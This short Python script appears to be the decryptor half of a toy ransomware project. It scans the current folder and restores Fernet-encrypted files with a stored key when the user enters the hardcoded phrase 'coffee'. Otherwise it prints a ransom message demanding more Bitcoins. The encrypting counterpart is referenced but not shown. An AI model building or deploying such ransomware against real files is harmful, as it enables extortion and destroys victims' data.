#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
    if file == "decrypt.py" or file == "thekey.key" or file == "encrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)


with open("thekey.key", "rb") as key:
    secretkey = key.read()

secretphrase = "coffee"
inputphrase = input("Enter the secret phrase to decrypt your files :|\n")

ok = False
if inputphrase == secretphrase:
    ok = True
    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        contents_decrypted = Fernet(secretkey).decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)

if ok:
    print("\nTake a breath, your files have been decrypted. Enjoy your coffee break.")
    print("THE KNOWER :)")
else:
    print("Ahhhh shit, here we go again. Send me more Bitcoins.\n")
